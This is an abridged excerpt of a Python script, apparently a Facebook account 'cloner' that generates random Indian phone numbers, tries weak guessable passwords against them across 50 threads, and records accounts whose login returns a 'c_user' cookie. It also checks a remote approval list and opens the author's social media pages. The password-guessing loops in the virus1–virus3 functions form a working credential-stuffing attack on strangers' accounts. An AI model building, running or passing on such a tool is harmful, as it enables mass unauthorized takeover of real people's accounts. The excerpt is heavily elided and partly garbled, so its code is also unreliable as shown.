...
print('\n\033[1;37m install modules....\n It will take some seconds...Mr Anish..')
os.system('xdg-open https://youtube.com/@AnishEditor9x?si=084C5HdeXwM773qk')
...
def menu_apikey():
  ...
  id = "@".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/ANISH/apv/main/apv-a').text
...
╚╝─╚╩╝╚╩╩══╩╝╚╝
  ...
  os.system('xdg-open https://www.facebook.com/anishedit2006')
  print("");time.sleep(2)
  print("\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/ANISH/apv/main/apv-a").text
    if id in httpCaht:
...
def Main():
	os.system('clear')
	print(logo)
	print("[1] IND Number Cloner [CP-OK MIX]")
	print("[2] IND Number cloner [APK] ")
	print("[3] IND Number cloner [Only Ok]")
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://chat.whatsapp.com/Ifw70nueE926sGcg9NLC9y');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/anishedit2006');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@AnishEditor9x?si=voR9eQNR74a_lNvJ');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virus1():
	...
	os.system('clear')
	print(logo)
	print(" Sim code Example : +91, 017, 018, 019")
	kode = input(' [★] Enter sim code: ')
	doamin = ' IND Number id cloner [CP-OK MIX] '
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','India','i love you','i hate you','i have you','i fuck you']
...
def virus2():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','India','i love you','i hate you','i have you','বাংলাদেশ']
...
def virus3():
	...
	print(" Sim code Example : 016, 017, 018, 019")
	kode = input(' [★] Enter sim code: ')
	doamin = ' IND Number cloner [Only Ok] '
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ANISH] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}ANISH{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
